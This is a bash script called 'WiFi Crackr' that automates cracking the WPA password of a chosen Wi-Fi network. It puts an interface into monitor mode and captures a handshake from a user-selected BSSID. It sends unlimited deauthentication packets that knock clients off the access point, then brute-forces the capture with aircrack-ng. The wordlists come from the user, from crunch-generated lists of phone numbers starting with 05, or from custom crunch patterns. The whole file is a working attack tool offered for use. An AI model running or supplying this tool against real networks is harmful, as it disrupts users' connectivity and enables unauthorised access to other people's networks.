#!/bin/bash

#Made by Omer Shor

function colors(){

# Define color codes
RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[0;33m"
BLUE="\033[0;34m"
PURPLE="\033[0;35m"
NC='\033[0m' # No Color

}

function d_figlet() {
# Check if figlet is installed by attempting to find its command
if ! command -v figlet &> /dev/null 2>&1;
        then
		echo -e "${RED}[-]${NC} Figlet is not installed, start installing figlet."
		echo -e "${YELLOW}[!]${NC} Please be patient, It might take a while (2 minutes)"
# Update the package list
		sudo apt update &> /dev/null 2>&1;
# Install figlet and impacket package using apt
                sudo apt install figlet -y &> /dev/null 2>&1;
# Display the title using figlet
		figlet "WiFi Crackr"
# Welcome message
		echo -e "${BLUE}[#]${NC} Hello! and wellcome to the WiFi Crackr"
else
# Display the title using figlet if already installed
		figlet "WiFi Crackr"
# Welcome message
                echo -e "${BLUE}[#]${NC} Hello! and wellcome to the WiFi Crackr"
fi

}

function d_aircrack(){

# Function to check and install aircrack-ng if it is not already installed
if ! command -v aircrack-ng &> /dev/null 2>&1;
        then
# Notify user that aircrack-ng is not installed
                echo -e "${RED}[-]${NC} aircrack-ng is not installed"
# Inform user that installation is starting
                echo -e "${BLUE}[#]${NC} start installing aircrack-ng"
# Install aircrack-ng silently
                sudo apt install aircrack-ng -y &> /dev/null 2>&1;
else
# Confirm that aircrack-ng is already installed
        echo -e "${GREEN}[+]${NC} aircrack-ng is installed!"

fi

}

function d_crunch(){

# Function to check and install crunch if it is not already installed
if ! command -v crunch &> /dev/null 2>&1;
        then
# Notify user that crunch is not installed
                echo -e "${RED}[-]${NC} crunch is not installed"
# Inform user that installation is starting
                echo -e "${BLUE}[#]${NC} start installing crunch"
# Install crunch silently
                sudo apt install crunch -y &> /dev/null 2>&1;
else
# Confirm that crunch is already installed
        echo -e "${GREEN}[+]${NC} crunch is installed!"

fi

}

# Function to run WiFi Crackr, including all steps for the audit
wifi_crackr() {
	# Welcome message
	echo -e "${BLUE}[#]${NC} Welcome to WiFi Crackr - Your go-to tool for Wi-Fi password cracking using airmon-ng."
	echo -e "${BLUE}[#]${NC} Please make sure you run this script with root account"

	# Check if the script is being run with root permissions
	if [[ $(id -u) != 0 ]]
    then
# Notify user to run as root
        echo -e "${RED}[-]${NC} Please run the script with root acount"
# Exit the script if not run with root privileges
        exit 1
    else
# Confirm user can proceed
        echo -e "${GREEN}[+]${NC} You will move forward to start scaning your target, Enjoy!"
	fi

# set folder for the audit files
# Get current time for timestamp
	TS=$(date +%H:%M)
# Create folder name with timestamp
	WiFi_Crackr="WiFi_Crackr_$TS"
# Create the directory for audit files
	mkdir -p $WiFi_Crackr
# Change to the new directory
	cd $WiFi_Crackr

}

function interface(){
	while true; do
# Display a message indicating the available network interfaces
	echo -e "${BLUE}[#]${NC} Your interfaces"
# List all network interfaces with their corresponding numbers
	iw dev | grep Interface | awk '{print NR ". " $2}'
# Prompt the user to select an interface
	read -p "$(echo -e "${PURPLE}[?]${NC}  Which network interface would you like to use? (enter number): ")" choice
# Validate and extract the selected interface
	selected_interface=$(iw dev | grep Interface | awk -v num="$choice" 'NR == num {print $2}')

	# Output the selected interface or an error message
	if [ -n "$selected_interface" ]
		 then
        	echo -e "${GREEN}[+]${NC} You have selected interface: $selected_interface"
		break
	else
# Notify user of an invalid selection
        echo -e "${RED}[-]${NC} Invalid selection. Please try again."
	fi
	done
}

function airmon(){
# Notify user about checking for interfering processes
	echo -e "${BLUE}[#]${NC} Checking for any processes that might interfere with airmon-ng..."
# Kill any processes that might interfere with airmon-ng silently
	airmon-ng check kill &> /dev/null 2>&1;
# Inform user about starting monitor mode
	echo -e "${BLUE}[#]${NC} Starting monitor mode on the selected interface: $selected_interface "
# Start monitor mode on the selected interface silently
	airmon-ng start $selected_interface &> /dev/null 2>&1;

}

function airodump(){
# Warn the user about the upcoming scan
	echo "######################################################################"
	echo -e "${YELLOW}[!]${NC} The network scan is about to start. To stop it, press Ctrl + C."
	echo "######################################################################"
# Wait for 5 seconds before starting the scan
	sleep 5
# Start the airodump-ng process on the selected interface
	airodump-ng $selected_interface
# Prompt for channel number
	while true
		do
			read -p "$(echo -e "${PURPLE}[?]${NC} Enter the channel number of your target: ")" channel
# Validate channel input			
			if [[ $channel =~ ^[0-9]+$ && $channel -ge 1 && $channel -le 14 ]]
				then
# Exit loop if input is valid					
					break
			else
# Notify user of invalid input
            	echo -e "${RED}[-]${NC} Invalid input. Please enter a valid channel number (1-14)."
        	fi
    	done
# Prompt for BSSID
	while true
		do
			read -p "$(echo -e "${PURPLE}[?]${NC} Enter the BSSID of your target (format: XX:XX:XX:XX:XX:XX): ")" BSSID
# Validate BSSID format
			if [[ $BSSID =~ ^([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}$ ]]
				then
# Exit loop if input is valid
					break
			else
# Notify user of invalid format
            	echo -e "${RED}[-]${NC} Invalid BSSID format. Please enter a valid BSSID (format: XX:XX:XX:XX:XX:XX)."
        	fi
    	done
# Start airodump-ng in a new terminal window
	gnome-terminal -- bash -c "sudo airodump-ng -w wificupture -c $channel --bssid $BSSID $selected_interface; exec bash ; disown" 
# Confirm airodump has started
	echo -e "${GREEN}[+]${NC} Airodump started in a new terminal window and is running independently."
# Inform user they can continue working
    echo -e "${GREEN}[+]${NC} You can continue with other operations in this terminal."
}



function aireplay() {
 
 # Inform the user about the next steps   
	echo "########################################################"
    echo -e "${YELLOW}[!]${NC} After the handshake is captured."
# Instructions for closing the terminal
	echo -e "${YELLOW}[!]${NC} First, close the new terminal that opened by clicking the 'X' with the computer mouse."
# Instructions for stopping the process
	echo -e "${YELLOW}[!]${NC} And then press Ctrl+C."
	echo "########################################################"
# Pause for 4 seconds before proceeding
	sleep 4

# Initialize a flag to detect interruption
    interrupted=false

# Trap to set the flag to true and kill the aireplay-ng process when SIGINT (Ctrl + C) is received
    trap 'interrupted=true; kill $PID &> /dev/null ; return' SIGINT 

# Run aireplay-ng in the background and get its PID
    echo -e "${BLUE}[#]${NC} Sending unlimited deauthentication packets to the access point with BSSID $BSSID on interface $selected_interface..."
# Start sending deauth packets silently
	aireplay-ng --deauth 0 -a $BSSID $selected_interface &> /dev/null 2>&1;

# Get the PID of the last background command
    PID=$!

# Wait for the background process to finish or be stopped
    wait $PID

# Retry loop for aireplay-ng if it fails
    while true
		do
        # Check if the interrupted flag is true
        	if [ "$interrupted" = true ]; then
# Notify user about interruption
				echo -e "${YELLOW}[!]${NC} Process interrupted by user. Exiting the loop."
				break
			fi

# Retry sending deauthentication packets
			sudo aireplay-ng --deauth 0 -a $BSSID $selected_interface &> /dev/null
# Update PID with the new aireplay-ng process
			PID=$!

# Wait for the background process to finish
			wait $PID
			
# Check if the command executed successfully (exit status 0)
			if [ $? -eq 0 ]; then
				sleep 1
			else
# Check if the interrupted flag is true before retrying
				if [ "$interrupted" = true ]; then
# Notify user about interruption
					echo -e "${YELLOW}[!]${NC} Process interrupted by user. Exiting the loop."
# Exit the loop
					break
				fi
# Notify user about failure
				echo -e "${RED}[-]${NC} The command failed. Retrying..."
			fi
		done

# Reset the trap to default behavior after the function
		trap - SIGINT
}


# The aircrack() function is designed to crack the password of a WiFi network based on a capture file (.cap).
# It provides options for the user to either supply their own password list, use a phone number list, or generate a password list using Crunch.
# Depending on the user's choice, the function performs password cracking using aircrack-ng and notifies if a key is found or not.

function aircrack() {
    while true
    do
# Prompt the user to choose a password list option
        read -p "$(echo -e "${PURPLE}[?]${NC}  To use your own password list, press (1). To use a list of phone numbers, press (2). To create a password list using Crunch, press (3): ")" pass_list
# Validate user input
        if [ "$pass_list" == "1" ] || [ "$pass_list" == "2" ] || [ "$pass_list" == "3" ]
			then
# Exit loop if valid input
				break
        else
# Error message for invalid input
            echo -e "${RED}[-]${NC} Invalid input. Please enter 1/2/3"
        fi
    done

# Option 1: User-defined password list
    if [ "$pass_list" == "1" ]
		then
			read -p "$(echo -e "${PURPLE}[?]${NC}  Please enter the full path of your password list: ")" user_pass_list
# Start cracking using user password list
			aircrack-ng wificupture-01.cap -w "$user_pass_list" | tee Password_cracking.txt
# Check if a password was found
			if grep -q "KEY FOUND!" Password_cracking.txt
				then
# Extract and display the found password	
					fpass=$(cat Password_cracking.txt | grep -w "FOUND!" | awk -F "!" '{print $2}' | head -n 1 | awk -F "[" '{print $2}' | awk -F "]" '{print $1}')
					echo -e "${GREEN}[+]${NC} Password found, the password is: $fpass"
					
			else
# Error message if no key found
				echo -e "${RED}[-]${NC} No matching key found for password cracking"
			fi
# Option 2: Generate password list from phone numbers
    elif [ "$pass_list" == "2" ]
		then
			echo -e "${BLUE}[#]${NC} You have chosen to use a phone number password list"
			echo -e "${BLUE}[#]${NC} Creating a password list of all possible phone numbers starting with 05*"
# Create phone number list
			crunch 10 10 -t 05%%%%%%%% -o phone_numbers.txt &> /dev/null 2>&1;
			echo -e "${BLUE}[#]${NC} The password list of phone numbers starting with 05 is ready"
			echo -e "${BLUE}[#]${NC} Starting the WiFi network password cracking"
# Start cracking using phone number list
			aircrack-ng wificupture-01.cap -w "phone_numbers.txt" | tee Password_cracking.txt
# Check if a password was found
			if grep -q "KEY FOUND!" Password_cracking.txt
				then	
# Extract and display the found password
					fpass=$(cat Password_cracking.txt | grep -w "FOUND!" | awk -F "!" '{print $2}' | head -n 1 | awk -F "[" '{print $2}' | awk -F "]" '{print $1}')
					echo -e "${GREEN}[+]${NC} Password found, the password is: $fpass"
					
			else
# Error message if no key found
				echo -e "${RED}[-]${NC} No matching key found for password cracking"
			fi
# Option 3: Create a custom password list using Crunch
    elif [ "$pass_list" == "3" ]
		then
			while true
			do
				echo -e "${BLUE}[#]${NC} You have chosen to create the password list yourself"
				echo -e "${YELLOW}[!]${NC} At any point, type 'R' to restart the process."
				
				# Get the minimum number of characters for the password list
# Get the minimum number of characters for the password list
				while true
				do
					read -p "$(echo -e "${PURPLE}[?]${NC}  Please enter the minimum number of characters for the password list: ")" min
					if [[ $min == "R" || $min == "r" ]]; then
						echo -e "${YELLOW}[!]${NC} Restarting the process..."
# Go back to the start
						continue 2  
					fi
					if [[ $min =~ ^[0-9]+$ ]]
					then
# Valid input, exit loop
						break
					else
# Error message for invalid input
						echo -e "${RED}[-]${NC} Invalid input. Please enter a numeric value."
					fi
				done

# Get the maximum number of characters for the password list
				while true
				do
					read -p "$(echo -e "${PURPLE}[?]${NC}  Please enter the maximum number of characters for the password list: ")" max
					if [[ $max == "R" || $max == "r" ]]; then
						echo -e "${YELLOW}[!]${NC} Restarting the process..."
# Go back to the start
						continue 2  
					fi
					if [[ $max =~ ^[0-9]+$ && $max -ge $min ]]
					then
# Valid input, exit loop
						break
					else
# Error message for invalid input
						echo -e "${RED}[-]${NC} Invalid input. Please enter a numeric value greater than or equal to $min."
					fi
				done

# Ask if the user wants to use a custom pattern
				while true
				do
					read -p "$(echo -e "${PURPLE}[?]${NC}  Do you want to use a custom pattern? (Y/N): ")" custom
					if [[ $custom == "R" || $custom == "r" ]]; then
						echo -e "${YELLOW}[!]${NC} Restarting the process..."
# Go back to the start						
						continue 2  
					fi
					if [[ $custom == "Y" || $custom == "y" || $custom == "N" || $custom == "n" ]]
					then
# Valid input, exit loop
						break
					else
# Error message for invalid input
						echo -e "${RED}[-]${NC} Invalid input. Please type 'Y' or 'N'."
					fi
				done

# Handle custom pattern input
				if [ "$custom" == "Y" ] || [ "$custom" == "y" ]
				then
					while true
					do
						echo -e "${BLUE}[#]${NC} Please enter the pattern (use (%) for numbers, (@) for lowercase, (,) for uppercase, (^) for symbols)"
						echo -e "${BLUE}[#]${NC} Example pattern: pass@@@@%%%^"
						read -p "$(echo -e "${PURPLE}[?]${NC} Enter pattern: ")" pattern

						if [[ $pattern == "R" || $pattern == "r" ]]; then
							echo -e "${YELLOW}[!]${NC} Restarting the process..."
# Go back to the start
							continue 2  
						fi
						
# Check that the length of the pattern matches the min/max exactly
						pattern_length=${#pattern}
						if [[ $pattern_length -eq $min || $pattern_length -eq $max ]]
						then
# Ask for the filename to save the password list
							while true
							do
								read -p "$(echo -e "${PURPLE}[?]${NC} Please enter the filename to save the password list (e.g., passwords.txt): ")" output_file
								if [[ $output_file == "R" || $output_file == "r" ]]; then
									echo -e "${YELLOW}[!]${NC} Restarting the process..."
# Go back to the start
									continue 2  
								fi
								if [[ -n $output_file ]]
								then
# Valid input, exit loop
									break
								else
# Error message for invalid input
									echo -e "${RED}[-]${NC} Invalid input. Please enter a valid filename."
								fi
							done

# Try running crunch with the user input
							echo -e "${GREEN}[+]${NC} Creating your password list, please be patient"
# Create the password list with the specified pattern
							crunch $min $max -t $pattern -o $output_file &> /dev/null 2>&1;
							if [[ $? -eq 0 ]]
							then
								echo -e "${BLUE}[#]${NC} Password list has been generated and saved to $output_file"
# Successfully generated, exit loop
								break 2  
							else
# Error message if crunch fails
								echo -e "${RED}[-]${NC} Invalid input for crunch. Please try again."
							fi
						else
# Error message for invalid pattern
							echo -e "${RED}[-]${NC} Invalid pattern. Please ensure the length is between $min and $max characters and try again."
						fi
					done

# Handle character set input
				elif [ "$custom" == "N" ] || [ "$custom" == "n" ]
				then
					while true
					do
						read -p "$(echo -e "${PURPLE}[?]${NC}  Please enter the characters you want to use in the password list (e.g., abcdef012345): ")" charset
						if [[ $charset == "R" || $charset == "r" ]]; then
							echo -e "${YELLOW}[!]${NC} Restarting the process..."
							continue 2  # Go back to the start
						fi
						
# Ask for the filename to save the password list
						while true
						do
							read -p "$(echo -e "${PURPLE}[?]${NC} Please enter the filename to save the password list (e.g., passwords.txt): ")" output_file
							if [[ $output_file == "R" || $output_file == "r" ]]; then
								echo -e "${YELLOW}[!]${NC} Restarting the process..."
# Go back to the start
								continue 2  
							fi
							if [[ -n $output_file ]]
							then
# Valid input, exit loop
								break
							else
# Error message for invalid input
								echo -e "${RED}[-]${NC} Invalid input. Please enter a valid filename."
							fi
						done
						
# Run crunch with the charset
						echo -e "${GREEN}[+]${NC} Creating your password list, please be patient"
# Create the password list with the specified charset
						crunch $min $max $charset -o $output_file &> /dev/null 2>&1;
						if [[ $? -eq 0 ]]
						then
							echo -e "${BLUE}[#]${NC} Password list has been generated and saved to $output_file"
# Successfully generated, exit loop
							break 2  
						else
# Error message if crunch fails
							echo -e "${RED}[-]${NC} Invalid input for crunch. Please try again."
						fi
					done
				fi
			done

# Start WiFi network password cracking using the generated password list		
			echo -e "${BLUE}[#]${NC} Starting the WiFi network password cracking"
			aircrack-ng wificupture-01.cap -w $output_file | tee Password_cracking.txt
			if grep -q "KEY FOUND!" Password_cracking.txt
				then	
# Extract and display the found password
					fpass=$(cat Password_cracking.txt | grep -w "FOUND!" | awk -F "!" '{print $2}' | head -n 1 | awk -F "[" '{print $2}' | awk -F "]" '{print $1}')
					echo -e "${GREEN}[+]${NC} Password found, the password is: $fpass"
					
			else
# Error message if no key found
				echo -e "${RED}[-]${NC} No matching key found for password cracking"
			fi
		fi
}
# Execution of functions
colors
d_figlet
d_aircrack
d_crunch
wifi_crackr
interface
airmon
airodump
aireplay
aircrack
